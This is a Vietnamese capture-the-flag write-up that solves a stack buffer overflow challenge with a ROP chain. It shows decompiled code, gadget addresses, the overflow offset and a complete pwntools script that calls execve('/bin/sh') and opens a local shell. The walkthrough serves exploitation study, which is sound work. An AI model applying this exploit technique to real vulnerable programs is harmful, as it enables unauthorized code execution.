# *Challenge: ROPchain_chall*
***

* **ROP Gadget** là một đoạn mã máy nhỏ (thường chỉ vài byte) kết thúc bằng lệnh ret và thực hiện một hành động đơn giản. Ví dụ như: pop rdi ; ret, mov rax, rdi ; ret, syscall, v.v.
* **Ứng dụng của ROPgadget** để tìm các đoạn mã (ROPgadgets) trong binary hoặc thư viện để giúp bạn tạo ROP chain thay thế cho shellcode (với những bài không thể thực thi shellcode trên stack do các cơ chế bảo vệ ).
- Các chế độ bảo vệ ảnh hưởng đến ROPgadget:
 ```txt
 ✅ NX (No eXecute)
Không thể dùng shellcode → phải dùng ROP chain để gọi hàm như execve
✅ Stack Canary
Ngăn ghi đè return address → cần leak hoặc bypass canary
✅ ASLR (Address Space Layout Randomization)
Địa chỉ gadget trong libc sẽ bị thay đổi → phải leak địa chỉ trước (ret2libc)
✅ PIE (Position Independent Executable)
Toàn bộ chương trình bị random base → không biết gadget ở đâu nếu không leak
✅ RELRO (Read-Only Relocations)
Không ảnh hưởng gadget, nhưng ngăn ghi GOT (dùng trong một số khai thác)
```
*Với file chall:*
```sh
pwndbg> checksec
File:     /mnt/d/Documents/ISP/TASK1/3_ROPgadget/ROPchain_chall
Arch:     amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
Debuginfo:  Yes
pwndbg>
```
- Canary bật nhưng không hiểu sao debug vẫn buffer overflow đc =)) chắc do lỗi của checksec
- NX enable -> ko thể thực thi shellcode trên stack -> phải nhặt các gadget để thực thi hàm execve
- PIE: No PIE - > ko cần leak địa chỉ do địa chỉ luôn cố định
**Xem pseudo code ở IDA xem, chương trình hoạt động ntn:**
- Có chỉ có 2 hàm chính init() và main():
Mô tả chương trình: Đầu tiên khởi tạo các biến v3, v4, v5, v6 và buffer v8[80] sau đó gọi hàm init để khởi tạo các bộ đệm, nhập v8 bằng gets và kết thúc chương trình 
 ```c
 int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // edx
  int v4; // ecx
  int v5; // r8d
  int v6; // r9d
  char v8[80]; // [rsp+0h] [rbp-50h] BYREF

  init();
  printf((unsigned int)"Say something: ", (_DWORD)argv, v3, v4, v5, v6, v8[0]);
  gets(v8);
  return 0;
}
 ```
 ```c
 __int64 init()
{
  setbuf(&_stdin_FILE, 0LL);
  setbuf(&_stderr_FILE, 0LL);
  return setbuf(&_stdout_FILE, 0LL);
}
 ```
**Nhận diện ROPchain:**
- Không có sẵn hàm system() hoặc hàm gọi shell trong file binary
- hàm gets() luôn xảy ra lỗi buffer overflow nên có thể dùng buffer overflow để điều khiển thanh ghi rip
- PIE tắt
- NX bật -> ko thực thi đc shellcode trên stack
-> Mục tiêu: tạo ROPchain bằng tiện ích ROPgadget để tạo shell thủ công 
**Tìm các gadget bằng ROPgadget**
- Tìm các gadget của pop rax, pop rdi, pop rsi, pop rdx và syscall tương ứng với các argument của hàm execve()
- Phải tìm gadget tại các pop vì pop dùng để đưa giá trị từ stack vào thanh ghi, giúp bạn điều khiển tham số của hàm hoặc syscall mà bạn muốn gọi.
```sh
$ ROPgadget --binary chall4 | grep "pop rdi"
$ ROPgadget --binary chall4 | grep "pop rsi"
$ ROPgadget --binary chall4 | grep "pop rdx"
$ ROPgadget --binary chall4 | grep "pop rax"
$ ROPgadget --binary chall4 | grep "syscall"
```
-> viết vào script
- Sau đó, ta sẽ tìm 1 địa chỉ có thể write đc của file chall này
 ```sh
 pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
          0x400000           0x401000 r--p     1000       0 ROPchain_chall
          0x401000           0x405000 r-xp     4000    1000 ROPchain_chall
          0x405000           0x406000 r--p     1000    5000 ROPchain_chall
          0x406000           0x408000 rw-p     2000    5000 ROPchain_chall
    0x7ffff7ff9000     0x7ffff7ffd000 r--p     4000       0 [vvar]
    0x7ffff7ffd000     0x7ffff7fff000 r-xp     2000       0 [vdso]
    0x7ffffffde000     0x7ffffffff000 rw-p    21000       0 [stack]
```
- ta thấy có địa chỉ 0x406000 có thể read và write đc nên ta dùng lệnh x/50xg 0x406000 để tìm 1 địa chỉ trống chưa có giá trị để write vào 
```sh
pwndbg>
0x406af0:       0x71706f6e68271e12      0x1514130f06052062
0x406b00:       0x181724280716081a      0x8323251f1b0e0a09
0x406b10:       0x3e3d3c2b2a267d82      0x5a59584d4a47433f
0x406b20:       0x6361605f5e5d5c5b      0x6c6b6a6967666564
0x406b30:       0x487c7b7a79747372      0x7b80000000000000
0x406b40:       0x0000000000000014      0x0110780100527a01
0x406b50:       0x0000019008070c1b      0x0000001c0000001c
0x406b60:       0x00000047ffffb5d9      0x0d430286100e4500
0x406b70:       0x00000008070c7e06      0x0000003c0000001c
0x406b80:       0x0000003fffffb600      0x0d430286100e4500
0x406b90:       0x00000008070c7606      0x0000000000000000
0x406ba0:       0x0000000000000000      0x0000000000000000
0x406bb0:       0x0000000000000000      0x0000000000000000
0x406bc0:       0x0000000000000000      0x0000000000000000
0x406bd0:       0x0000000000000000      0x0000000000000000
0x406be0:       0x0000000000000000      0x0000000000000000
0x406bf0:       0x0000000000000000      0x0000000000000000
0x406c00:       0x0000000000000000      0x0000000000000000
0x406c10:       0x0000000000000000      0x0000000000000000
0x406c20:       0x0000000000000000      0x0000000000000000
0x406c30:       0x0000000000000000      0x0000000000000000
0x406c40:       0x0000000000000000      0x0000000000000000
0x406c50:       0x0000000000000000      0x0000000000000000
0x406c60:       0x0000000000000000      0x0000000000000000
0x406c70:       0x0000000000000000      0x0000000000000000
pwndbg>
```
-> Chọn 1 trong các địa chỉ trống rồi viết vào script
 ```py
 pop_rdi = 0x000000000040220e
pop_rsi = 0x00000000004015ae
pop_rdx = 0x00000000004043e4
pop_rax = 0x0000000000401001
syscall = 0x000000000040132e

rw_section = 0x406be0
```
***Viết Payload:**
- Trước tiên ta sẽ tính offet từ hàm gets đến return
 ```sh
 pwndbg> cyclic -l 0x616161616161616c
Finding cyclic pattern of 8 bytes: b'laaaaaaa' (hex: 0x6c61616161616161)
Found at offset 88
pwndbg>
```
-> ta sẽ truyền vào 88 byte rác vào trước sau đó thiết lập thanh ghi rdi với địa chỉ có thể write vào payload
 
-> overwrite rip thành gadget pop rdi, sau đó pop cái địa chỉ có thể ghi đc sau đó đến địa chỉ của hàm gets() để ta nhập chuỗi ‘/bin/sh’
- Sau đó ta sẽ viết tiếp payload để thực thi luôn hàm execve(“/bin/sh”, 0, 0) với 3 argument:
rdi = con trỏ trỏ tới địa chỉ “/bin/sh” , rsi = 0, rdx = 0 và syscall numer rax = 0x3b
- Ở đây ta thấy lệnh add rsp, 0x28 sau khi pop rsi rdx, ta cần cộng thêm 0x28 byte rác để nhảy trúng pop rax
Script:
 ```py
 #Payload
payload = flat(b'a'*88, pop_rdi, rw_section, exe.sym['gets'])

payload += flat(pop_rdi, rw_section)
payload += flat(pop_rsi, 0)
payload += flat(pop_rdx, 0)
payload += b'b'*0x28
payload += flat(pop_rax, 0x3b, syscall)

p.sendlineafter(b'something: ', payload)
p.sendline(b'/bin/sh\0')
p.interactive()
```
- Kiểm tra bằng debug động:
-> đã đúng script

- Giờ giử solve.py lên:
```sh
$ python3 solve.py
[+] Starting local process '/mnt/d/Documents/ISP/TASK1/3_ROPgadget/ROPchain_chall': pid 326
[*] Switching to interactive mode
$
$ whoami
d1nhdwc
$ ls
 ROPchain_chall       report3.docx   solve.py
 ROPchain_chall.i64   report3.md    '~$eport3.docx'
$
```
 ***-> đã chiếm đc shell***
